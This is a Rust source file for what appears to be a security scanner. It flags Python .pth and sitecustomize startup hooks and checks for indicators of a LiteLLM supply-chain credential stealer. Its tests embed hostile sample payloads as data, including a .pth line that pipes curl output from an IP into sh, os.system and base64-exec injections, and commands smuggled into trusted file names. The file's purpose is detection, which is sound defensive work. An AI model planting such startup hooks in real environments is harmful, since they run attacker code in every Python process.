//! Python interpreter startup hooks. Python's `site` module executes every line that starts with
//! `import` in each `*.pth` file of a site-packages directory, and imports `sitecustomize` /
//! `usercustomize` if present — at the start of *every* Python process, before any user code.
//! That is how the October 2026 LiteLLM 1.107.0 release ran its credential stealer without ever
//! being imported, so hooks that execute code are worth surfacing.
//!
//! Two collectors live here:
//!   * `python_startup_hooks` — one row per hook that executes code (or whose content couldn't be
//!     read, in which case `executes_code` is omitted and the rule reports a collector error).
//!   * `supply_chain_iocs` — one row per known supply-chain indicator actually present on disk.

use super::Collector;
use crate::models::Fact;
use serde_json::Value;
use std::path::{Path, PathBuf};

pub struct PythonStartupHooksCollector;
pub struct SupplyChainIocsCollector;

/// The lines `site` would execute: those starting with `import` followed by a blank.
fn code_lines(text: &str) -> impl Iterator<Item = &str> {
    text.lines().filter(|l| {
        l.strip_prefix("import")
            .is_some_and(|rest| rest.starts_with(' ') || rest.starts_with('\t'))
    })
}

/// A Python package name such as `google.cloud`, quoted the way `repr()` writes it.
const PKG: &str = r"'[A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z_][A-Za-z0-9_]*)*'";
/// One quoted identifier.
const ID: &str = r"'[A-Za-z_][A-Za-z0-9_]*'";

/// A line of a setuptools `-nspkg.pth`. setuptools has generated four versions of it since 2016
/// (all in `tests/data/pth-real-samples.tsv`), each a `;`-joined list of the statements below with
/// only package names filled in. Checking statement by statement accepts every version and
/// nothing else: none of them can run code, they only register a namespace package.
fn is_nspkg_line(line: &str) -> bool {
    static STATEMENTS: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let statements = STATEMENTS.get_or_init(|| {
        let alternatives = [
            r"has_mfs = sys\.version_info > \(3, 5\)".to_string(),
            r"pep420 = sys\.version_info > \(3, 3\)".to_string(),
            format!(
                r"p = os\.path\.join\(sys\._getframe\(1\)\.f_locals\['sitedir'\], \*\({ID}(?:, {ID})*,?\)\)"
            ),
            r"ie = os\.path\.exists\(os\.path\.join\(p,'__init__\.py'\)\)".to_string(),
            r"importlib = (?:has_mfs and )?__import__\('importlib\.util'\)".to_string(),
            r"(?:has_mfs and )?__import__\('importlib\.machinery'\)".to_string(),
            format!(
                r"m = (?:has_mfs and )?sys\.modules\.setdefault\({PKG}, importlib\.util\.module_from_spec\(importlib\.machinery\.PathFinder\.find_spec\({PKG}, \[os\.path\.dirname\(p\)\]\)\)\)"
            ),
            format!(
                r"m = (?:m or |not ie and (?:not pep420 and )?)sys\.modules\.setdefault\({PKG}, types\.ModuleType\({PKG}\)\)"
            ),
            r"mp = \(m or \[\]\) and m\.__dict__\.setdefault\('__path__',\[\]\)".to_string(),
            r"\(p not in mp\) and mp\.append\(p\)".to_string(),
            format!(r"m and setattr\(sys\.modules\[{PKG}\], {ID}, m\)"),
        ];
        regex::Regex::new(&format!("^(?:{})$", alternatives.join("|"))).expect("valid regex")
    });
    let mut parts = line.trim_end().split(';');
    parts.next() == Some("import sys, types, os")
        && parts.clone().count() >= 3
        && parts.all(|statement| statements.is_match(statement))
}

/// A line of a setuptools editable install: `import <finder>; <finder>.install()`, where the
/// finder module is `__editable___<project>_<version>_finder`.
fn is_editable_finder_line(line: &str) -> bool {
    let Some((module, call)) = line
        .trim_end()
        .strip_prefix("import ")
        .and_then(|rest| rest.split_once("; "))
    else {
        return false;
    };
    module.starts_with("__editable___")
        && module.ends_with("_finder")
        && module
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_')
        && call == format!("{module}.install()")
}

fn is_distutils_precedence_line(line: &str) -> bool {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    // setuptools 50 to 59 default to 'stdlib', 60 and later to 'local'; 49 had no `var`.
    RE.get_or_init(|| {
        regex::Regex::new(
            r"^import os; (?:var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os\.environ\.get\(var, '(?:local|stdlib)'\)|enabled = os\.environ\.get\('SETUPTOOLS_USE_DISTUTILS'\)) == 'local'; enabled and __import__\('_distutils_hack'\)\.add_shim\(\);$",
        )
        .expect("valid regex")
    })
    .is_match(line.trim_end())
}

/// Fixed lines that tools other than setuptools write, each exactly as the tool ships it (blanks
/// aside: pytest-cov has shipped the same code with two indentations).
const FIXED_PTH_LINES: &[(&str, &[&str])] = &[
    ("_virtualenv.pth", &["import _virtualenv"]),
    ("pywin32.pth", &["import pywin32_bootstrap"]),
    (
        "easy-install.pth",
        &[
            "import sys; sys.__plen = len(sys.path)",
            "import sys; new=sys.path[sys.__plen:]; del sys.path[sys.__plen:]; p=getattr(sys,'__egginsert',0); sys.path[p:p]=new; sys.__egginsert = p+len(new)",
        ],
    ),
    ("coverage.pth", COVERAGE_LINES),
    ("a1_coverage.pth", COVERAGE_LINES),
    (
        "pytest-cov.pth",
        &[r#"import os, sys;exec('if \'COV_CORE_SOURCE\' in os.environ:\n try:\n  from pytest_cov.embed import init\n  init()\n except Exception as exc:\n  sys.stderr.write(\n   "pytest-cov: Failed to setup subprocess coverage. "\n   "Environ: {0!r} "\n   "Exception: {1!r}\\n".format(\n    dict((k, v) for k, v in os.environ.items() if k.startswith(\'COV_CORE\')),\n    exc\n   )\n  )\n')"#],
    ),
    (
        // coloredlogs installs itself into the root logger when $COLOREDLOGS_AUTO_INSTALL is set.
        "coloredlogs.pth",
        &[r#"import os; exec('try: __import__("coloredlogs").auto_install() if os.environ.get("COLOREDLOGS_AUTO_INSTALL") else None\nexcept ImportError: pass')"#],
    ),
];

const COVERAGE_LINES: &[&str] = &[
    "import coverage; coverage.process_startup()",
    r#"import sys; exec('import os\n\nif os.getenv("COVERAGE_PROCESS_START"):\n try:\n  import coverage\n except:\n  pass\n else:\n  coverage.process_startup()')"#,
    r#"import sys; exec('import os\n\nif os.getenv("COVERAGE_PROCESS_START") or os.getenv("COVERAGE_PROCESS_CONFIG"):\n try:\n  import coverage\n except:\n  pass\n else:\n  coverage.process_startup(slug="pth")')"#,
];

fn without_blanks(line: &str) -> String {
    line.chars().filter(|c| !matches!(c, ' ' | '\t')).collect()
}

/// True for a `.pth` produced by a well-known legitimate mechanism (setuptools editable installs,
/// namespace packages and its distutils shim, virtualenv, coverage, pytest-cov, pywin32,
/// coloredlogs): the file has that tool's **name** and every line of code in it is one that tool
/// **writes**. The name alone used to be enough, so a payload saved as
/// `__editable__.x.pth` or `anything-nspkg.pth` passed as known software.
pub fn is_known_benign_pth(name: &str, text: &str) -> bool {
    let check: Box<dyn Fn(&str) -> bool> = if name == "distutils-precedence.pth" {
        Box::new(is_distutils_precedence_line)
    } else if name.starts_with("__editable__") {
        Box::new(is_editable_finder_line)
    } else if name.ends_with("-nspkg.pth") {
        Box::new(is_nspkg_line)
    } else if let Some((_, lines)) = FIXED_PTH_LINES.iter().find(|(n, _)| *n == name) {
        Box::new(move |line| {
            let line = without_blanks(line);
            lines.iter().any(|known| without_blanks(known) == line)
        })
    } else {
        return false;
    };
    code_lines(text).all(check)
}

/// Number of lines `site` would execute: those starting with `import` followed by whitespace.
pub fn executable_pth_lines(text: &str) -> usize {
    code_lines(text).count()
}

/// Names the LiteLLM 1.107.0 payload dropped into site-packages.
const LITELLM_PAYLOAD_PTH: &str = "cook.pth";

/// `prefix/lib/python3*` and `prefix/lib64/python3*`. Fedora and RHEL keep a second
/// site-packages under `lib64` (`site.getsitepackages()` lists it first there), and Python runs
/// the `.pth` files of both. Reading only `lib` missed every hook in the other.
fn python_lib_dirs(prefix: &Path) -> Vec<PathBuf> {
    ["lib", "lib64"]
        .iter()
        .filter_map(|lib| std::fs::read_dir(prefix.join(lib)).ok())
        .flat_map(|entries| entries.flatten())
        .filter(|e| e.file_name().to_string_lossy().starts_with("python3"))
        .map(|e| e.path())
        .collect()
}

/// `prefix/lib/python3*/{site,dist}-packages` that exist.
fn site_dirs_under(prefix: &Path) -> Vec<PathBuf> {
    python_lib_dirs(prefix)
        .into_iter()
        .flat_map(|lib| [lib.join("site-packages"), lib.join("dist-packages")])
        .filter(|d| d.is_dir())
        .collect()
}

fn children(dir: &Path) -> Vec<PathBuf> {
    std::fs::read_dir(dir)
        .map(|it| it.flatten().map(|e| e.path()).collect())
        .unwrap_or_default()
}

/// Every site-packages directory worth checking: system, user, conda/pyenv/pipx/uv environments,
/// and project virtualenvs (any `pyvenv.cfg` up to four levels below a home directory).
pub(crate) fn site_package_dirs() -> Vec<PathBuf> {
    let mut prefixes: Vec<PathBuf> = vec![PathBuf::from("/usr"), PathBuf::from("/usr/local")];
    for home in super::user_homes() {
        prefixes.push(home.join(".local"));
        for conda in ["miniconda3", "anaconda3", "miniforge3", "mambaforge"] {
            let base = home.join(conda);
            prefixes.push(base.clone());
            prefixes.extend(children(&base.join("envs")));
        }
        for managed in [
            ".pyenv/versions",
            ".virtualenvs",
            ".local/share/virtualenvs",
            ".local/share/uv/tools",
            ".local/share/pipx/venvs",
            ".local/pipx/venvs",
        ] {
            prefixes.extend(children(&home.join(managed)));
        }
        let walker = walkdir::WalkDir::new(&home)
            .max_depth(4)
            .follow_links(false)
            .into_iter()
            .filter_entry(|e| {
                let name = e.file_name().to_string_lossy();
                e.depth() == 0
                    || !(name == "node_modules"
                        || name == ".git"
                        || name == ".cache"
                        || name == ".local"
                        || name.starts_with("miniconda")
                        || name.starts_with("anaconda"))
            });
        for entry in walker.flatten() {
            if entry.file_type().is_file() && entry.file_name() == "pyvenv.cfg" {
                if let Some(venv) = entry.path().parent() {
                    prefixes.push(venv.to_path_buf());
                }
            }
        }
    }
    // Canonicalize so a symlinked alias (conda's `lib/python3.1` -> `python3.10`) is one directory.
    let mut dirs: Vec<PathBuf> = prefixes
        .iter()
        .flat_map(|p| site_dirs_under(p))
        .map(|d| d.canonicalize().unwrap_or(d))
        .collect();
    dirs.sort();
    dirs.dedup();
    dirs
}

fn hook_rows(site: &Path) -> Vec<Fact> {
    let mut rows = Vec::new();
    let Ok(entries) = std::fs::read_dir(site) else {
        return rows;
    };
    // A site-packages folder inside a home folder is its owner's to fill, so its files are opened
    // under the rules of `homefs` (no link out of the home folder, no pipe, and under root only
    // files that owner owns). One elsewhere belongs to root.
    let home = super::home_of(site);
    for entry in entries.flatten() {
        let Ok(ft) = entry.file_type() else { continue };
        if !ft.is_file() {
            continue;
        }
        let name = entry.file_name().to_string_lossy().into_owned();
        let hook_type = if name.ends_with(".pth") {
            "pth"
        } else if name == "sitecustomize.py" {
            "sitecustomize"
        } else if name == "usercustomize.py" {
            "usercustomize"
        } else {
            continue;
        };
        let path = entry.path();
        let mut fact = Fact::new();
        fact.insert("path".into(), Value::String(path.display().to_string()));
        fact.insert("hook_type".into(), Value::String(hook_type.into()));
        fact.insert(
            "malicious_name".into(),
            Value::Bool(name == LITELLM_PAYLOAD_PTH),
        );
        let mut known_benign = false;
        if hook_type == "pth" {
            let read = match &home {
                Some(home) => super::read_home(home, &path),
                None => super::read_system(&path),
            };
            match read {
                crate::homefs::HomeFile::Found(read) => {
                    let executes = executable_pth_lines(&read.text) > 0;
                    if !executes && !read.truncated {
                        // A path-only .pth just extends sys.path; not a code-execution hook.
                        continue;
                    }
                    if executes {
                        fact.insert("executes_code".into(), Value::Bool(true));
                        // A file that was cut may hold a line past the cut that the tool never
                        // wrote, so it is not vouched for.
                        known_benign = !read.truncated && is_known_benign_pth(&name, &read.text);
                    } else {
                        // Nothing in the part that was read; the rest is unknown.
                        fact.insert(
                            crate::homefs::COULD_NOT_READ.into(),
                            Value::String(super::TOO_LARGE.into()),
                        );
                    }
                }
                // Unreadable: leave `executes_code` out so the rule reports it as undetermined.
                crate::homefs::HomeFile::Missing | crate::homefs::HomeFile::Refused => {
                    let reason = match &home {
                        Some(_) => crate::homefs::REFUSED,
                        None => super::refused_reason(&path),
                    };
                    fact.insert(
                        crate::homefs::COULD_NOT_READ.into(),
                        Value::String(reason.into()),
                    );
                }
            }
        } else {
            fact.insert("executes_code".into(), Value::Bool(true));
        }
        fact.insert("known_benign".into(), Value::Bool(known_benign));
        rows.push(fact);
    }
    rows
}

impl Collector for PythonStartupHooksCollector {
    fn name(&self) -> &'static str {
        "python_startup_hooks"
    }

    fn collect(&self) -> anyhow::Result<Vec<Fact>> {
        Ok(site_package_dirs()
            .iter()
            .flat_map(|d| hook_rows(d))
            .collect())
    }
}

fn ioc_row(indicator: &str, path: &Path) -> Fact {
    let mut fact = Fact::new();
    fact.insert("indicator".into(), Value::String(indicator.into()));
    fact.insert("path".into(), Value::String(path.display().to_string()));
    fact
}

/// LiteLLM 1.107.0 indicators in a temp directory: the backdoor's lock file and the stealer's
/// "already ran" markers.
pub fn temp_dir_iocs(tmp: &Path) -> Vec<Fact> {
    let mut rows = Vec::new();
    let lock = tmp.join("remote_code_loader.lock");
    if std::fs::symlink_metadata(&lock).is_ok() {
        rows.push(ioc_row("litellm_loader_lock", &lock));
    }
    if let Ok(entries) = std::fs::read_dir(tmp) {
        for entry in entries.flatten() {
            if entry.file_name().to_string_lossy().starts_with(".pc_once_") {
                rows.push(ioc_row("litellm_exfil_marker", &entry.path()));
            }
        }
    }
    rows
}

impl Collector for SupplyChainIocsCollector {
    fn name(&self) -> &'static str {
        "supply_chain_iocs"
    }

    fn collect(&self) -> anyhow::Result<Vec<Fact>> {
        let mut rows = temp_dir_iocs(Path::new("/tmp"));
        rows.extend(temp_dir_iocs(Path::new("/var/tmp")));
        for site in site_package_dirs() {
            let pth = site.join(LITELLM_PAYLOAD_PTH);
            if std::fs::symlink_metadata(&pth).is_ok() {
                rows.push(ioc_row("litellm_cook_pth", &pth));
            }
        }
        Ok(rows)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn site_packages_under_lib64_are_found_too() {
        let prefix = tempfile::tempdir().unwrap();
        for dir in [
            "lib/python3.14/site-packages",
            "lib64/python3.14/site-packages",
            "lib/python3.12/dist-packages",
            "lib64/not-python/site-packages",
        ] {
            fs::create_dir_all(prefix.path().join(dir)).unwrap();
        }
        let mut found: Vec<String> = site_dirs_under(prefix.path())
            .iter()
            .map(|d| d.strip_prefix(prefix.path()).unwrap().display().to_string())
            .collect();
        found.sort();
        assert_eq!(
            found,
            [
                "lib/python3.12/dist-packages",
                "lib/python3.14/site-packages",
                "lib64/python3.14/site-packages"
            ]
        );
    }

    #[test]
    fn only_import_lines_execute() {
        assert_eq!(
            executable_pth_lines("/opt/lib\nimport os; os.system('x')\n"),
            1
        );
        assert_eq!(executable_pth_lines("importlib_path\n/opt/x\n"), 0);
        assert_eq!(executable_pth_lines("import\tsys\n"), 1);
    }

    /// `(file name, code line)` for every line in the fixture of real `.pth` files.
    fn real_samples() -> Vec<(&'static str, &'static str)> {
        include_str!("../../tests/data/pth-real-samples.tsv")
            .lines()
            .filter(|l| !l.starts_with('#') && !l.is_empty())
            .map(|l| l.split_once('\t').expect("name<TAB>line"))
            .collect()
    }

    #[test]
    fn every_real_tool_written_pth_is_recognised() {
        let samples = real_samples();
        assert!(
            samples.len() >= 20,
            "the fixture is there: {}",
            samples.len()
        );
        for (name, line) in &samples {
            assert!(
                is_known_benign_pth(name, &format!("{line}\n")),
                "{name}: {line}"
            );
        }
        // Path lines beside the code change nothing, and a path-only file has no code to doubt.
        assert!(is_known_benign_pth(
            "easy-install.pth",
            "import sys; sys.__plen = len(sys.path)\n./pkg.egg\n/opt/src\nimport sys; new=sys.path[sys.__plen:]; del sys.path[sys.__plen:]; p=getattr(sys,'__egginsert',0); sys.path[p:p]=new; sys.__egginsert = p+len(new)\n",
        ));
        assert!(is_known_benign_pth(
            "__editable__.mypkg-1.0.pth",
            "/home/dev/mypkg/src\n"
        ));
        assert!(is_known_benign_pth(
            "_virtualenv.pth",
            "import _virtualenv\n"
        ));
        // The same pytest-cov code with the four-space indentation of its source file.
        let (_, cov) = samples
            .iter()
            .find(|(n, _)| *n == "pytest-cov.pth")
            .unwrap();
        assert!(is_known_benign_pth(
            "pytest-cov.pth",
            &cov.replace("\\n ", "\\n    ")
        ));
    }

    #[test]
    fn a_trusted_name_does_not_vouch_for_other_code() {
        // The reported gap: these names were allowed whatever the file held.
        let payload = "import os; os.system('curl -s http://203.0.113.9/u | sh')\n";
        for name in [
            "__editable__.x-1.0.pth",
            "__editable___x_finder.pth",
            "anything-nspkg.pth",
            "distutils-precedence.pth",
            "_virtualenv.pth",
            "easy-install.pth",
            "a1_coverage.pth",
            "coverage.pth",
            "pytest-cov.pth",
            "pywin32.pth",
            "coloredlogs.pth",
        ] {
            assert!(!is_known_benign_pth(name, payload), "{name}");
        }
        // A real line with something added to it, or a second line beside it.
        for (name, line) in real_samples() {
            let line = line.trim_end();
            for tampered in [
                format!("{line};__import__('os').system('id')\n"),
                format!("{line}; import subprocess\n"),
                format!("{line}\nimport base64; exec(base64.b64decode('aWQ='))\n"),
                line.replacen("import ", "import os, subprocess, ", 1),
            ] {
                assert!(!is_known_benign_pth(name, &tampered), "{name}: {tampered}");
            }
        }
        // Near misses of each template.
        for (name, text) in [
            // The finder that is installed must be the one that was imported.
            ("__editable__.x-1.0.pth", "import __editable___x_1_0_finder; os.system('id')"),
            ("__editable__.x-1.0.pth", "import __editable___x_1_0_finder; __editable___y_finder.install()"),
            ("__editable__.x-1.0.pth", "import evil; evil.install()"),
            // A namespace line whose "package name" is code.
            ("x-nspkg.pth", "import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('a',));m = m or sys.modules.setdefault(__import__('os').system('id'), types.ModuleType('a'))"),
            ("x-nspkg.pth", "import sys, types, os"),
            ("distutils-precedence.pth", "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('evil').add_shim();"),
            // The right content under a name that tool does not use.
            ("cook.pth", "import _virtualenv"),
            ("requests.pth", "import coverage; coverage.process_startup()"),
        ] {
            assert!(!is_known_benign_pth(name, text), "{name}: {text}");
        }
    }

    #[test]
    fn a_payload_under_a_trusted_name_is_reported_by_the_real_rule() {
        let site = tempfile::tempdir().unwrap();
        fs::write(
            site.path().join("__editable__.x-1.0.pth"),
            "import os; os.system('id')\n",
        )
        .unwrap();
        fs::write(
            site.path().join("zope.event-4.6-py3.9-nspkg.pth"),
            "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('zope',));importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');m = has_mfs and sys.modules.setdefault('zope', importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('zope', [os.path.dirname(p)])));m = m or sys.modules.setdefault('zope', types.ModuleType('zope'));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)\n",
        )
        .unwrap();
        let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let (rules, errors) = crate::engine::load_rules(&dir);
        assert!(errors.is_empty(), "{errors:?}");
        let rule = rules
            .into_iter()
            .find(|r| r.rule.id == "BLWK-PERSIST-005")
            .expect("in the pack")
            .condition;
        let fired: Vec<String> = hook_rows(site.path())
            .into_iter()
            .filter(|row| rule.eval(row).unwrap())
            .map(|row| row["path"].as_str().unwrap().to_string())
            .collect();
        assert_eq!(fired.len(), 1, "{fired:?}");
        assert!(fired[0].ends_with("__editable__.x-1.0.pth"));
    }

    #[cfg(unix)]
    #[test]
    fn an_oversized_pth_is_undetermined_and_a_pipe_is_never_waited_on() {
        let site = tempfile::tempdir().unwrap();
        // 4.3 MB of path lines, then the code: what was read holds no code, the rest is unknown.
        let mut big = "/opt/some/path/on/sys/path\n".repeat(160_000);
        big.push_str("import os; os.system('id')\n");
        assert!(big.len() as u64 > crate::collectors::MAX_COLLECTOR_READ_BYTES);
        fs::write(site.path().join("big.pth"), big).unwrap();
        let (tx, rx) = std::sync::mpsc::channel();
        let path = site.path().to_path_buf();
        std::thread::spawn(move || {
            let _ = tx.send(hook_rows(&path));
        });
        let rows = rx
            .recv_timeout(std::time::Duration::from_secs(20))
            .expect("must not block");
        assert_eq!(rows.len(), 1, "{rows:?}");
        assert!(
            !rows[0].contains_key("executes_code"),
            "undetermined, not false"
        );
        assert_eq!(
            rows[0][crate::homefs::COULD_NOT_READ],
            crate::collectors::TOO_LARGE
        );
    }

    #[test]
    fn hook_rows_flag_code_hooks_and_skip_path_only_pth() {
        let site = tempfile::tempdir().unwrap();
        fs::write(site.path().join("paths.pth"), "/opt/extra\n").unwrap();
        fs::write(site.path().join("evil.pth"), "import os\n").unwrap();
        fs::write(site.path().join("sitecustomize.py"), "print('hi')\n").unwrap();
        let rows = hook_rows(site.path());
        assert_eq!(rows.len(), 2, "{rows:?}");
        let evil = rows
            .iter()
            .find(|r| r["path"].as_str().unwrap().ends_with("evil.pth"))
            .unwrap();
        assert_eq!(
            evil.get("executes_code"),
            Some(&Value::Bool(true)),
            "{evil:?}"
        );
        assert_eq!(
            evil.get("known_benign"),
            Some(&Value::Bool(false)),
            "{evil:?}"
        );
        assert_eq!(
            evil.get("malicious_name"),
            Some(&Value::Bool(false)),
            "{evil:?}"
        );
    }

    /// The LiteLLM payload is recognised by name alone. Its content is deliberately NOT the real
    /// payload shape: Windows Defender quarantines a `cook.pth` that imports `cook`, which made this
    /// test fail with "file contains a virus" (os error 225) and would alarm any developer's AV.
    /// A read blocked that way leaves `executes_code` undetermined, never false.
    #[test]
    fn litellm_payload_name_is_flagged_without_reading_it() {
        let site = tempfile::tempdir().unwrap();
        fs::write(site.path().join("cook.pth"), "import os\n").unwrap();
        let rows = hook_rows(site.path());
        let cook = rows
            .iter()
            .find(|r| r["path"].as_str().unwrap().ends_with("cook.pth"))
            .unwrap();
        assert_eq!(
            cook.get("malicious_name"),
            Some(&Value::Bool(true)),
            "{cook:?}"
        );
        assert_ne!(
            cook.get("executes_code"),
            Some(&Value::Bool(false)),
            "{cook:?}"
        );
    }

    #[test]
    fn temp_dir_iocs_find_lock_and_markers() {
        let tmp = tempfile::tempdir().unwrap();
        assert!(temp_dir_iocs(tmp.path()).is_empty());
        fs::write(tmp.path().join("remote_code_loader.lock"), "").unwrap();
        fs::write(tmp.path().join(".pc_once_abc"), "").unwrap();
        let mut kinds: Vec<String> = temp_dir_iocs(tmp.path())
            .iter()
            .map(|r| r["indicator"].as_str().unwrap().to_string())
            .collect();
        kinds.sort();
        assert_eq!(kinds, ["litellm_exfil_marker", "litellm_loader_lock"]);
    }
}
